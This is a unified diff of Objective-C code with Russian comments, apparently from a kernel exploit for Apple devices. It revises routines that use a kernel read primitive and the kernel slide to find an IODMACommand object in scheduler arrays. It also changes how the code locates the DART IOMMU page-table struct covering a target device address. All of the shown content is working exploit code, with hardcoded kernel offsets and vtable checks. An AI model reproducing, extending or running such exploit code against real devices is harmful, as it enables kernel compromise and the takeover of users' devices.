@@ -6698,21 +6698,33 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     shown++;
                 }
                 kpNote(r, [NSString stringWithFormat:@"  [P2] живых записей в первых 384: %d", live]);
-                for (uint32_t i = 0; i < 2048 && !cmdVA; i++) {
-                    uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
-                    if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
-                    if ((uint32_t)(ep & 0x3fff) + 0x798 > 0x4000) continue;
-                    if (kp_untag_ptr(early_kread64(ep + 0x788)) != surfVA &&
-                        kp_untag_ptr(early_kread64(ep + 0x48)) != ucVA) continue;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] наша запись [%u]=%#llx ✓", i, (unsigned long long)ep]);
-                    uint64_t cand = kp_untag_ptr(early_kread64(ep + 0x790));
-                    if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
-                        uint64_t cvt = kp_untag_ptr(early_kread64(cand));
-                        uint64_t cFile = cvt ? cvt - kslide2 : 0;
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[ep+0x790]=%#llx vt(file)=%#llx%@",
-                                  (unsigned long long)cand, (unsigned long long)cFile,
-                                  (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
-                        if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
+                // 1.9.173 (р.43): completed-записи во ВТОРОЙ коллекции [sched+0x110]
+                // (count2 [sched+0x100]) — pending [sched+0xc8] дренут. Скан обеих.
+                uint64_t arr2 = kp_untag_ptr(early_kread64(schVA + 0x110));
+                uint64_t cnt2 = early_kread64(schVA + 0x100);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] completed array2=%#llx count2=%llu",
+                          (unsigned long long)arr2, (unsigned long long)cnt2]);
+                for (uint32_t pass = 0; pass < 2 && !cmdVA; pass++) {
+                    uint64_t a2 = pass ? earr : arr2;
+                    uint64_t n2 = pass ? 2048 : (cnt2 && cnt2 < 4096 ? cnt2 : 0);
+                    if (!kpLooksLikeKernelPointer(a2)) continue;
+                    for (uint32_t i = 0; i < n2 && !cmdVA; i++) {
+                        uint64_t ep = kp_untag_ptr(early_kread64(a2 + i * 8));
+                        if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
+                        if ((uint32_t)(ep & 0x3fff) + 0x798 > 0x4000) continue;
+                        if (kp_untag_ptr(early_kread64(ep + 0x788)) != surfVA &&
+                            kp_untag_ptr(early_kread64(ep + 0x48)) != ucVA) continue;
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] наша запись %s[%u]=%#llx ✓",
+                                  pass ? "pending" : "array2", i, (unsigned long long)ep]);
+                        uint64_t cand = kp_untag_ptr(early_kread64(ep + 0x790));
+                        if (kpLooksLikeKernelPointer(cand) && kvtophys(cand)) {
+                            uint64_t cvt = kp_untag_ptr(early_kread64(cand));
+                            uint64_t cFile = cvt ? cvt - kslide2 : 0;
+                            kpNote(r, [NSString stringWithFormat:@"  [P2] cmd=[ep+0x790]=%#llx vt(file)=%#llx%@",
+                                      (unsigned long long)cand, (unsigned long long)cFile,
+                                      (uint32_t)cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
+                            if ((uint32_t)cFile == 0x7afa9e8) cmdVA = cand;
+                        }
                     }
                 }
             }
@@ -6733,25 +6745,26 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       (unsigned long long)dartVA, (unsigned long long)dvt,
                       (unsigned long long)(dvt ? dvt - kslide2 : 0),
                       (uint32_t)(dvt - kslide2) == 0x7dafcb0 ? @" ✓" : @""]);
-            // корень таблиц: group=[dart+0xc50] (транзиентная?) → [group+0x170]
-            // segIdx=0; fallback — персистентный дубль [dart+0xcd0+i*8] → +0x80 (р.38)
+            // 1.9.173 (р.43): table struct = [dartObj+0xcd0 + segIdx*8] (персистент;
+            // L0 embedded, +0x80 = leaf-struct ptr). Struct выбираем bounds-check'ом
+            // [tbl+0x20]≤DVA<[tbl+0x28] — segIdx не нужен. group+0xc50 не трогаем
+            // (транзиентная view — поэтому и пуста).
             uint64_t tableRoot = 0;
-            uint64_t grp = kp_untag_ptr(early_kread64(dartVA + 0xc50));
-            if (kpLooksLikeKernelPointer(grp) && kvtophys(grp)) {
-                tableRoot = kp_untag_ptr(early_kread64(grp + 0x170));
-                kpNote(r, [NSString stringWithFormat:@"  [P2] group=%#llx → tableRoot(+0x170)=%#llx",
-                          (unsigned long long)grp, (unsigned long long)tableRoot]);
+            for (uint32_t i = 0; i < 16 && !tableRoot; i++) {
+                uint64_t ts = kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8));
+                if (!kpLooksLikeKernelPointer(ts) || !kvtophys(ts)) continue;
+                if ((uint32_t)(ts & 0x3fff) + 0x88 > 0x4000) continue;
+                uint64_t lo = early_kread64(ts + 0x20);
+                uint64_t hi = early_kread64(ts + 0x28);
+                uint64_t leafS = kp_untag_ptr(early_kread64(ts + 0x80));
+                kpNote(r, [NSString stringWithFormat:@"  [P2] table struct [%u]=%#llx range [%#llx..%#llx) +0x80=%#llx%@",
+                          i, (unsigned long long)ts, (unsigned long long)lo, (unsigned long long)hi,
+                          (unsigned long long)leafS,
+                          (lo && hi && dva >= lo && dva < hi) ? @" ← DVA ВНУТРИ ✓" : @""]);
+                if (lo && hi && dva >= lo && dva < hi)
+                    tableRoot = (kpLooksLikeKernelPointer(leafS) && kvtophys(leafS)) ? leafS : ts;
             }
-            if (!kpLooksLikeKernelPointer(tableRoot)) {
-                for (uint32_t i = 0; i < 8 && !tableRoot; i++) {
-                    uint64_t dup = kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8));
-                    if (!kpLooksLikeKernelPointer(dup) || !kvtophys(dup)) continue;
-                    uint64_t leaf = kp_untag_ptr(early_kread64(dup + 0x80));
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] дубль [%u]=%#llx → +0x80=%#llx", i,
-                              (unsigned long long)dup, (unsigned long long)leaf]);
-                    if (kpLooksLikeKernelPointer(leaf) && kvtophys(leaf)) tableRoot = leaf;
-                }
-            }
+            if (!tableRoot) kpNote(r, [NSString stringWithFormat:@"  [P2] ни один table struct не содержит DVA=%#llx", (unsigned long long)dva]);
             if (kpLooksLikeKernelPointer(tableRoot) && kvtophys(tableRoot)) {
                 uint64_t pageIdx = dva >> 14;
                 uint32_t idxs[4] = { (uint32_t)((pageIdx & 0x3e00000000ULL) >> 33),
